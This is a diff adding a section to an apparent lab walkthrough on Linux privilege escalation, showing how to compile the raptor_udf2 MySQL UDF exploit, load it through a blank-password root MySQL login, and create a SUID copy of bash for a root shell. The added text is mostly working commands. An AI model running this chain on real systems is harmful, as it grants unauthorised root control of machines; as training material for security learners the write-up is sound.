@@ -101,7 +101,54 @@ This section might be a little advanced for some - It involves compiling the [My
 
 <br />
 
+We first need to navigate to the file location at `/home/user/tools/mysql-udf`.
+```
+cd /home/user/tools/mysql-udf
+```
+
+Following the instructions provided on the exploit [link](https://www.exploit-db.com/exploits/1518) provided above, we need to compile the file before use:
+
+`gcc -g -c raptor_udf2.c`
+<br />
+`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
+
+Once compiled, we can proceed to run `mysql` as `root` using a blank password:
+
+`mysql -u root -p`
+
+![image](https://user-images.githubusercontent.com/14150485/172220178-7765795d-509d-4c8b-8780-1041318062a9.png)
+
+We can now proceed with the following commands on the `mysql` shell to create a User Defined Function (UDF) `do_system` using the exploit we compiled:
+
+`use mysql;`
+<br />
+`create table foo(line blob);`
+<br />
+`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
+<br />
+`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
+<br />
+`create function do_system returns integer soname 'raptor_udf2.so';`
+
+The table entries can be confirmed with the following command:
+
+`select * from mysql.func;`
+
+![image](https://user-images.githubusercontent.com/14150485/172221440-d3b92d41-c2bb-46a8-9584-9a51764dcfbb.png)
+
+Now, we copy `/bin/bash` to `/tmp/rootbash` and set the SUID permission:
+
+`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
+
+Exit the `mysql` shell by typing `exit` or `\q`. Running the `/tmp/rootbash` shell will grant root privileges on the machine.
+
+`/tmp/rootbash -p`
+
+![image](https://user-images.githubusercontent.com/14150485/172222490-17d98725-2456-4d71-9005-2c9aa3b83e45.png)
+
 I strongly recommend following along the step by step instructions and researching the exploit and commands being used in parallel as part of your learning process.
+
+<br />
 	
 ### 2.1: Read and follow along with the above.
 ```
